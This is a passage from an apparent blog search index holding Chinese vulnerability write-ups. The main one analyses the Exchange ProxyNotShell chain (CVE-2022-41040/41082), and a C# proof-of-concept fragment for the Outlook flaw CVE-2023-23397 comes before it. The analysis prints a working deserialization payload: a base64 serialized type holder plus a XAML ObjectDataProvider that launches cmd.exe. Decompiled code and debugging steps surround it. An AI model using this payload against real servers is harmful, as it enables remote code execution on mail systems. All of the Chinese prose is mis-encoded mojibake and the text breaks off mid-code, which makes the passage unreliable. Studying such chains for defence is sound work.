options.PreserveEmbeddedMessageFormat = true; options.PreserveRtfContent = true; smtpClient.Send(msg.ToMailMessage(options)); Console.WriteLine(\u0026#34;success send\u0026#34;); } catch (Exception ex) { Console.WriteLine(\u0026#34;error:\u0026#34; + ex.ToString()); } } } } å°ç»“ è¯¥æ¼æ´æ˜¯å…¸å‹çš„é€»è¾‘æ¼æ´ï¼Œç”±äºå¾®è½¯æ²¡æœ‰é™åˆ¶é‚®ä»¶çš„è¿‡æœŸå£°éŸ³æ–‡ä»¶è·¯å¾„å±æ€§ï¼Œå¯¼è‡´å¯ä»¥è®¾ç½®è¿™ä¸ªå±æ€§ä¸ºUNCè·¯å¾„æ¥è®©outlookå‘èµ·NTLMè¯·æ±‚ï¼Œå°è¯•ä»ç½‘ç»œåŠ è½½æ–‡ä»¶ï¼Œä»è€Œå·å–NTLM hashã€‚\nç¬¬ä¸€æ¬¡å°è¯•ä½¿ç”¨outlookæ„é€ PoCæ—¶å¤±è´¥äº†ï¼Œæœ€åæ‰¾åˆ°äº†C#çš„é‚®ä»¶åº“Asposeï¼Œé€šè¿‡ä¿®æ”¹Asposeåº“å¹¶åˆ©ç”¨è¯¥åº“å°±å¯ä»¥è®¾ç½®PidLidReminderFileParameterå±æ€§äº†ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/\nhttps://github.com/Sicos1977/MsgKit\nhttps://research.checkpoint.com/2023/the-obvious-the-normal-and-the-advanced-a-comprehensive-analysis-of-outlook-attack-vectors/\nCreated at 2023-05-05T20:50:19+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/","title":"Proxy Not Shell åˆ©ç”¨é“¾åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"æ¼æ´ç¯å¢ƒ Windows Server 2019 Windows Exchange 2019 CU9 æ¼æ´åˆ†æ æ¼æ´é“¾åŒ…å«äº†ä¸¤ä¸ªæ¼æ´ï¼š\nCVE-2022-41040 Exchange æƒé™æå‡æ¼æ´ CVE-2022-41082 Exchange è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-41040 æ˜¯ProxyShellä¿®å¤ä¸å®Œå…¨çš„äº§ç‰©ï¼Œåœ¨ProxyShellåˆ©ç”¨é“¾ä¸­æ— éœ€èº«ä»½éªŒè¯å°±å¯ä»¥é€šè¿‡autodiscover.jsonè¯·æ±‚åˆ°/PowerShellæ¥å£ï¼Œåœ¨CVE-2022-41040 ä¸­ï¼Œä»…éœ€è¦ä½æƒé™èº«ä»½éªŒè¯å°±å¯ä»¥è¯·æ±‚åˆ°è¯¥æ¥å£ï¼Œé€šè¿‡SSRFå°†ä½æƒé™è½¬æ¢ä¸ºé«˜æƒé™ã€‚\nCVE-2022-41082æ˜¯Exchangeçš„ååºåˆ—åŒ–æ¼æ´ï¼Œé€šè¿‡ä¼ å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œä½¿å¾—Exchangeè§¦å‘èƒ½å¤Ÿé€ æˆä»£ç æ‰§è¡Œçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œå°†æŒ‡å®šæ•°æ®ååºåˆ—åŒ–åˆ°æ¶æ„ç±»ï¼Œä»è€Œåœ¨ExchangeæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚\nåœ¨PoCä¸­å‘é€äº†ä»¥ä¸‹ä¸‰ç§ç±»å‹çš„PSRPæ¶ˆæ¯\n0x00010002 SESSION_CAPABILITY\nSESSION_CAPABILITY åº”è¯¥æ˜¯åˆ›å»ºRunspacePool\n0x00010004 INIT_RUNSPACEPOOL\nINIT_RUNSPACEPOOL åº”è¯¥æ˜¯åˆå§‹åŒ–RunspacePool\n0x00021006 CREATE_PIPELINE\nåˆ›å»ºå‘½ä»¤ç®¡é“å¹¶åœ¨æŒ‡å®šçš„ RunspacePool ä¸­è°ƒç”¨å®ƒ\nPoCé€šè¿‡PSRPåè®®åˆ›å»ºäº†è¿œç¨‹PowerShellç®¡é“ï¼Œå¹¶è¯•å›¾åœ¨è¿™ä¸ªç®¡é“å†…æ‰§è¡ŒNew-OfflineAddressBookè¿™ä¸ªcmdletï¼Œå¹¶å°†å¯¹åº”çš„åºåˆ—åŒ–æ•°æ®ä¼ ç»™äº†Exchangeã€‚\nPoCä¸»è¦ç»„æˆéƒ¨åˆ†å¦‚ä¸‹æ‰€ç¤ºï¼ŒBAæ ‡ç­¾å†…æ˜¯base64ç¼–ç çš„åºåˆ—åŒ–System.UnitySerializationHolderå¯¹è±¡\n\u0026lt;Obj N=\u0026#34;V\u0026#34; RefId=\u0026#34;14\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;Name\u0026#34;\u0026gt;Type\u0026lt;/S\u0026gt; \u0026lt;Obj N=\u0026#34;TargetTypeForDeserialization\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Exception\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;MS\u0026gt; \u0026lt;BA N=\u0026#34;SerializationData\u0026#34;\u0026gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=\u0026lt;/BA\u0026gt; \u0026lt;/MS\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;S\u0026gt; \u0026lt;![CDATA[\u0026lt;ResourceDictionary xmlns=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation\u0026#34; xmlns:x=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml\u0026#34; xmlns:System=\u0026#34;clr-namespace:System;assembly=mscorlib\u0026#34; xmlns:Diag=\u0026#34;clr-namespace:System.Diagnostics;assembly=system\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider x:Key=\u0026#34;LaunchCalch\u0026#34; ObjectType=\u0026#34;{x:Type Diag:Process}\u0026#34; MethodName=\u0026#34;Start\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider.MethodParameters\u0026gt;\u0026lt;System:String\u0026gt;cmd.exe\u0026lt;/System:String\u0026gt;\u0026lt;System:String\u0026gt;/c whoami\u0026gt; c:\\users\\public\\1.txt\u0026lt;/System:String\u0026gt; \u0026lt;/ObjectDataProvider.MethodParameters\u0026gt; \u0026lt;/ObjectDataProvider\u0026gt; \u0026lt;/ResourceDictionary\u0026gt;]]\u0026gt; \u0026lt;/S\u0026gt; \u0026lt;/Obj\u0026gt; XamlReader.Parse() BAæ ‡ç­¾æ•°æ® .....Ã¿Ã¿Ã¿Ã¿..............System.UnitySerializationHolder..... Data\tUnityType.AssemblyName......... System.Windows.Markup.XamlReader......... XPresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35. PoCéƒ¨åˆ†ç”±ä¸¤ä¸ªå¯¹è±¡åµŒå¥—è€Œæˆï¼Œå¤§è‡´ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š\nObj V(System.ServiceProcess.ServiceController): String Name=\u0026#34;Type\u0026#34; Obj TargetTypeForDeserialization(System.Exception): ByteArray SerializationData String SerializationData ä»£ç é€»è¾‘\nä»£ç é€»è¾‘å¦‚ä¸‹å›¾\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\r\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\rèƒŒæ™¯ 1\rCenter Gradient\ré¡µ-1\ræµç¨‹\rReadOneObject\rReadOneObject\tæµç¨‹.8\rReadOneDeserializedObject éå†XMLæ ‘çš„æ ‡ç­¾\rReadOneDeserializedObjectéå†XMLæ ‘çš„æ ‡ç­¾\tåŠ¨æ€è¿æ¥çº¿\rè°ƒç”¨è¯»å–ä¸€ä¸ªååºåˆ—åŒ–å¯¹è±¡ object obj = this.ReadOneDeserializedObject\rè°ƒç”¨ï¼Œè¯»å–ä¸€ä¸ªååºåˆ—åŒ–å¯¹è±¡object obj = this.ReadOneDeserializedObject\tåŠ¨æ€è¿æ¥çº¿.12\rç¢°åˆ°Objæ ‡ç­¾è°ƒç”¨è¯»å–ä¸€ä¸ªObjå¯¹è±¡ if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){ return thi...\rç¢°åˆ°Objæ ‡ç­¾ï¼Œè°ƒç”¨ï¼Œè¯»å–ä¸€ä¸ªObjå¯¹è±¡if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){return this.ReadPSObject();}\tæµç¨‹.11\rReadPSObject è¯»å–ä¸€ä¸ªObjå¯¹è±¡\rReadPSObjectè¯»å–ä¸€ä¸ªObjå¯¹è±¡\tåŠ¨æ€è¿æ¥çº¿.14\rç¢°åˆ°Propsæ ‡ç­¾è°ƒç”¨è¯»å–Propsæ ‡ç­¾ if (this.IsNextElement(\u0026#34;Props\u0026#34;)){ this.R...\rç¢°åˆ°Propsæ ‡ç­¾ï¼Œè°ƒç”¨ï¼Œè¯»å–Propsæ ‡ç­¾if (this.IsNextElement(\u0026#34;Props\u0026#34;)){this.ReadProperties(psobject);}\tæµç¨‹.13\rReadProperties\rReadProperties\tåŠ¨æ€è¿æ¥çº¿.16\rè°ƒç”¨è¯»å–åµŒå¥—å¯¹è±¡\rè°ƒç”¨ï¼Œè¯»å–åµŒå¥—å¯¹è±¡\tæµç¨‹.15\rReadOneObject\rReadOneObject\tåŠ¨æ€è¿æ¥çº¿.20\rè°ƒç”¨å°†ååºåˆ—åŒ–æ•°æ® è½¬æ¢ä¸ºç›®æ ‡ç±»å‹æ­¤æ—¶ç›®æ ‡ç±»å‹ä¸ºSystem.Exception\rè°ƒç”¨ï¼Œå°†ååºåˆ—åŒ–æ•°æ®è½¬æ¢ä¸ºç›®æ ‡ç±»å‹ï¼Œæ­¤æ—¶ç›®æ ‡ç±»å‹ä¸ºSystem.Exception\tæµç¨‹.19\rConvertTo\rConvertTo\tåŠ¨æ€è¿æ¥çº¿.22\rä¸€ç³»åˆ—è°ƒç”¨\rä¸€ç³»åˆ—è°ƒç”¨\tæµç¨‹.21\rObject.Reader.Deserialize\rObject.Reader.Deserialize\tåŠ¨æ€è¿æ¥çº¿.24\rè°ƒç”¨è§£æå†…å­˜ä¸­çš„åºåˆ—åŒ–æ•°æ®\rè°ƒç”¨ï¼Œè§£æå†…å­˜ä¸­çš„åºåˆ—åŒ–æ•°æ®\tæµç¨‹.23\r__BinaryParser.Run\r__BinaryParser.Run\tåŠ¨æ€è¿æ¥çº¿.28\ræµç¨‹.27\rå°†åºåˆ—åŒ–æ•°æ®è§£æä¸ºSystem.UnitySerializationHolderå¯¹è±¡å¹¶è½½å…¥m_assmblyNameå¯¹åº”çš„...\rå°†åºåˆ—åŒ–æ•°æ®è§£æä¸ºSystem.UnitySerializationHolderå¯¹è±¡ï¼Œå¹¶è½½å…¥m_assmblyNameå¯¹åº”çš„DLL\tåŠ¨æ€è¿æ¥çº¿.39\ræµç¨‹.38\rè½¬åŒ–ä¸ºåœ¨m_assmblyNameå¯¹åº”çš„DLLä¸­çš„m_dataå¯¹åº”ç±»å‹çš„Typeå¯¹è±¡\rè½¬åŒ–ä¸ºåœ¨m_assmblyNameå¯¹åº”çš„DLLä¸­çš„m_dataå¯¹åº”ç±»å‹çš„Typeå¯¹è±¡\tåŠ¨æ€è¿æ¥çº¿.41\rä¸€ç³»åˆ—è¿”å›\rä¸€ç³»åˆ—è¿”å›\tåŠ¨æ€è¿æ¥çº¿.43\ræµç¨‹.42\rå°†ConverToè¿”å›çš„Typeå¯¹è±¡åŠ å…¥.adaptedMembers\rå°†ConverToè¿”å›çš„Typeå¯¹è±¡åŠ å…¥.adaptedMembers\tæµç¨‹.45\rGetTargetTypeForDeserialization\rGetTargetTypeForDeserialization\tæµç¨‹.53\rReadOneDeserializedObject\rReadOneDeserializedObject\tæµç¨‹.54\rReadOneObject\rReadOneObject\tåŠ¨æ€è¿æ¥çº¿.56\råŠ¨æ€è¿æ¥çº¿.57\råŠ¨æ€è¿æ¥çº¿.58\råŠ¨æ€è¿æ¥çº¿.59\rè°ƒç”¨\rè°ƒç”¨\tåŠ¨æ€è¿æ¥çº¿.61\ræµç¨‹.60\rGetPSStandardMember\rGetPSStandardMember\tåŠ¨æ€è¿æ¥çº¿.63\ræµç¨‹.62\rè¯»å–adaptedMembersçš„TargetTypeForDeserializationå¹¶è¿”å›\rè¯»å–adaptedMembersçš„TargetTypeForDeserializationå¹¶è¿”å›\tåŠ¨æ€è¿æ¥çº¿.66\rè°ƒç”¨å°†å¤–å±‚å¯¹è±¡åºåˆ—åŒ–æ•°æ®\rè°ƒç”¨ï¼Œå°†å¤–å±‚å¯¹è±¡åºåˆ—åŒ–æ•°æ®\tæµç¨‹.65\rLanguagePrimitives.ConvertTo\rLanguagePrimitives.ConvertTo\tåŠ¨æ€è¿æ¥çº¿.69\ræµç¨‹.68\rå°†Sæ ‡ç­¾å†…æ•°æ®è½¬æ¢ä¸ºXamlReaderå¯¹è±¡è§¦å‘ä»£ç æ‰§è¡Œ\rå°†Sæ ‡ç­¾å†…æ•°æ®è½¬æ¢ä¸ºXamlReaderå¯¹è±¡ï¼Œè§¦å‘ä»£ç æ‰§è¡Œ\tåœ¨Exchangeä¸­ï¼Œå…è®¸ååºåˆ—åŒ–çš„ç±»ç™½åå•å’Œç±»ååºåˆ—åŒ–ç›¸å…³ä¿¡æ¯å®šä¹‰åœ¨exchange.partial.types.ps1xmlå’Œexchange.types.ps1xmlç­‰æ–‡ä»¶ä¸­ï¼ŒExchangeä¼šè¯»å–è¿™äº›æ–‡ä»¶ï¼Œåœ¨ååºåˆ—åŒ–æ•°æ®æ—¶ï¼Œä¼špayloadé‡Œé¢çš„ç›®æ ‡ç±»å’Œæ–‡ä»¶é‡Œé¢çš„ç™½åå•ç±»åšå¯¹æ¯”ï¼Œåªæœ‰åœ¨ç™½åå•å†…çš„ç±»æ‰å…è®¸ååºåˆ—åŒ–ã€‚\nPoCç”±åµŒå¥—å¯¹è±¡ç»„æˆï¼Œåœ¨ååºåˆ—åŒ–åµŒå¥—å¯¹è±¡æ—¶ï¼Œä¼šå…ˆååºåˆ—åŒ–é‡Œå±‚å¯¹è±¡ï¼Œè€Œåååºåˆ—åŒ–å¤–å±‚å¯¹è±¡ã€‚åœ¨Exchangååºåˆ—åŒ–PoCçš„é‡Œå±‚å¯¹è±¡æ—¶ï¼Œå°†é€šè¿‡ConvertToå‡½æ•°è½¬æ¢åˆ°ç›®æ ‡ç±»ï¼Œä¼ ç»™ConvertToçš„resultTypeå€¼ä¸ºSystem.Exceptionï¼ŒSystem.Exceptionåœ¨exchange.partial.types.ps1xmlä¸­å®šä¹‰å¦‚ä¸‹ï¼š\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.Exception\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;CodeProperty IsHidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;SerializationData\u0026lt;/Name\u0026gt; \u0026lt;GetCodeReference\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;MethodName\u0026gt;GetSerializationData\u0026lt;/MethodName\u0026gt; \u0026lt;/GetCodeReference\u0026gt; \u0026lt;/CodeProperty\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;TypeConverter\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;/TypeConverter\u0026gt; \u0026lt;/Type\u0026gt; internal static object ConvertTo(object valueToConvert, Type resultType, bool recursion, IFormatProvider formatProvider, TypeTable backupTypeTable) { object result; using (LanguagePrimitives.typeConversion.TraceScope(\u0026#34;Converting \\\u0026#34;{0}\\\u0026#34; to \\\u0026#34;{1}\\\u0026#34;.\u0026#34;, valueToConvert, resultType)) { if (resultType == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;resultType\u0026#34;); } bool flag; result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, out flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : null, formatProvider, backupTypeTable); } return result; } å…¶å®šä¹‰äº†*\u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt;ï¼ŒExchangeå°†é€šè¿‡Microsoft.Exchange.Data.SerializationTypeConverter*ç±»å¯¹é‡Œå±‚åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–ã€‚Microsoft.Exchange.Data.SerializationTypeConverterç»è¿‡ä¸€ç³»åˆ—è°ƒç”¨ï¼Œæœ€ç»ˆç”±System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚\nåœ¨è¯¥æ–¹æ³•ä¼šè°ƒç”¨System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Runï¼Œè¿™æ–¹æ³•ä¼šå¾ªç¯è¯»å–å†…å­˜ä¸­çš„é‡Œå±‚å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼Œå°†å…¶è½¬æ¢ä¸ºSystem.UnitySerializationHolderå¯¹è±¡ã€‚\nä¹‹åExchangeä¼šé€šè¿‡Assembly.LoadFromè½½å…¥*System.UnitySerializationHolder.m_assemblyNameæ‰€æŒ‡æ˜çš„DLLï¼Œå¹¶ä¸”è¿”å›System.UnitySerializationHolder.m_data*ç±»å‹çš„Typeå¯¹è±¡ã€‚\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ...... serParser.Run(); ...... if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } åœ¨ä¸€ç³»åˆ—å‡½æ•°è°ƒç”¨è¿”å›åï¼ŒSystem.Management.Automation.InternalDeserializer.ReadPropertiesä¼šå°†System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeè¿”å›çš„å¯¹è±¡æ·»åŠ åˆ°PSObject.adaptedMembersä¸­ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥å¯¹è±¡å˜é‡åä¸ºTargetTypeForDeserializationã€‚\nprivate void ReadProperties(PSObject dso) { dso.isDeserialized = true; dso.adaptedMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod\u0026lt;PSMemberInfo\u0026gt;(dso, \u0026#34;GetType\u0026#34;)); PSGetMemberBinder.SetHasInstanceMember(\u0026#34;GetType\u0026#34;); dso.clrMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); if (this.ReadStartElementAndHandleEmpty(\u0026#34;Props\u0026#34;)) { while (this._reader.NodeType == XmlNodeType.Element) { string name = this.ReadNameAttribute(); object serializedValue = this.ReadOneObject(); PSProperty member = new PSProperty(name, serializedValue); dso.adaptedMembers.Add(member); } this.ReadEndElement(); } } åœ¨ååºåˆ—åŒ–å¤–å±‚å¯¹è±¡æ—¶ï¼ŒReadOneObjectä¼šè°ƒç”¨GetTargetTypeForDeserializationè·å–ååºåˆ—åŒ–çš„ç›®æ ‡ç±»å‹ï¼Œå¹¶é€šè¿‡ConvertToè½¬åŒ–ä¸ºè¯¥å¯¹è±¡ã€‚\nåœ¨GetTargetTypeForDeserializationå‡½æ•°ä¸­ï¼Œå°†ä¼šè°ƒç”¨GetPSStandardMemberå¹¶ä¼ å…¥ç¡¬ç¼–ç çš„TargetTypeForDeserializationï¼Œåœ¨GetPSStandardMemberä¸­ä¼šé€šè¿‡TypeTableGetMemberDelegateåˆ›å»ºæˆå‘˜é›†åˆï¼Œå…¶ä¸­åŒ…æ‹¬å­ç±»çš„æˆå‘˜å±æ€§ï¼Œè€ŒååŒ¹é…å…¶ä¸­çš„memberNameé¡¹å¯¹åº”çš„å€¼å¹¶è¿”å›ã€‚æ­¤æ—¶è·å–çš„å€¼ä¸ºXamlReaderç±»å‹çš„Typeå¯¹è±¡ã€‚\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } internal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } å¤–å±‚ç±»ç±»å‹å®šä¹‰ä¸ºSystem.ServiceProcess.ServiceControllerï¼Œå…¶å®šä¹‰åœ¨types.ps1xmlæ–‡ä»¶å†…ï¼Œå®šä¹‰å¦‚ä¸‹ã€‚\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;MemberSet\u0026gt; \u0026lt;Name\u0026gt;PSStandardMembers\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;PropertySet\u0026gt; \u0026lt;Name\u0026gt;DefaultDisplayPropertySet\u0026lt;/Name\u0026gt; \u0026lt;ReferencedProperties\u0026gt; \u0026lt;Name\u0026gt;Status\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;DisplayName\u0026lt;/Name\u0026gt; \u0026lt;/ReferencedProperties\u0026gt; \u0026lt;/PropertySet\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/MemberSet\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServiceName\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;RequiredServices\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServicesDependedOn\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;ScriptMethod\u0026gt; \u0026lt;Name\u0026gt;ToString\u0026lt;/Name\u0026gt; \u0026lt;Script\u0026gt; $this.ServiceName \u0026lt;/Script\u0026gt; \u0026lt;/ScriptMethod\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/Type\u0026gt; åœ¨GetPSStandardMemberå‡½æ•°ä¼šè¯•å›¾è·å–System.ServiceProcess.ServiceControllerç±»çš„TargetTypeForDeserializationï¼ˆä¼ å…¥çš„ç¡¬ç¼–ç å‚æ•°ï¼‰å±æ€§ï¼Œä½†å…¶åœ¨æ–‡ä»¶å†…æ²¡æœ‰å®šä¹‰é»˜è®¤çš„TargetTypeForDeserializationå€¼ï¼Œæ‰€ä»¥å¤–å±‚ç±»çš„memberså†…æ²¡æœ‰TargetTypeForDeserializationåå­—çš„å€¼ï¼ŒExchangeå°†è¯•å›¾ä»å­ç±»çš„memberså±æ€§ä¸­æ£€ç´¢TargetTypeForDeserializationåå­—çš„å€¼ï¼Œå‰é¢è¯´è¿‡åœ¨å¯¹å†…å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œé€šè¿‡ReadPropertieså°†åä¸ºTargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡æ·»åŠ åˆ°äº†adaptedMembersä¸­ï¼Œæ­¤æ—¶Exchangeå°†ä¼šæ£€ç´¢åˆ°è¯¥å¯¹è±¡å¹¶è¿”å›ã€‚\nè·å–åˆ°targetTypeForDeserializationä¹‹åï¼ŒReadOneObjectè°ƒç”¨LanguagePrimitives.ConvertToå°†åºåˆ—åŒ–æ•°æ®è½¬æ¢ä¸ºtargetTypeForDeserialization(XamlReader)ã€‚\ninternal object ReadOneObject(out string streamName) { .... object obj = this.ReadOneDeserializedObject(out streamName, out flag); ..... Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(this._typeTable); .... object obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, true, CultureInfo.InvariantCulture, this._typeTable); ..... } ConvertToå‡½æ•°ä¼šè¿›è¡Œå¦‚ä¸‹è°ƒç”¨é“¾ï¼Œé€šè¿‡åå°„è·å–åˆ°XamlReaderç±»çš„Parseæ–¹æ³•åï¼Œå°†å…¶è°ƒç”¨ï¼ŒæˆåŠŸæ‰§è¡Œä»£ç ã€‚\nè°ƒè¯• ä½¿ç”¨dnsPyé™„åŠ åˆ°ä¸‹é¢çš„è¿›ç¨‹\nc:\\windows\\system32\\inetsrv\\w3wp.exe -ap \u0026#34;MSExchangePowerShellAppPool\u0026#34; -v \u0026#34;v4.0\u0026#34; -c \u0026#34;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\u0026#34; -a \\\\.\\pipe\\iisipm319caf0c-5de0-4833-8a04-4b28f4a836ae -h \u0026#34;C:\\inetpub\\temp\\apppools\\MSExchangePowerShellAppPool\\MSExchangePowerShellAppPool.config\u0026#34; -w \u0026#34;\u0026#34; -m 0 åœ¨ä»¥ä¸‹å‡ ä¸ªåœ°æ–¹ä¸‹æ–­ç‚¹\nSystem.Runtime.Serialization.Formatters.Binary ObjectReader.Deserialize å‘é€PoCï¼Œè°ƒè¯•å™¨åœ¨æ–­ç‚¹å¤„æ–­ä¸‹ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹:\næ­¤æ—¶ä¸ºExchangeè¯•å›¾å°†Propsæ ‡ç­¾å†…çš„åºåˆ—åŒ–æ•°æ®é€šè¿‡ConvertToå‡½æ•°è½¬åŒ–ä¸ºSystem.Exceptionå¯¹è±¡ï¼ŒSystem.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeä¼šé€šè¿‡serParser.Run()è§£æè¯»å…¥å†…å­˜ä¸­çš„base64è§£ç æ•°æ®ã€‚\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ..... serParser.Run(); if (this.bFullDeserialization) { this.m_objectManager.DoFixups(); } if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = 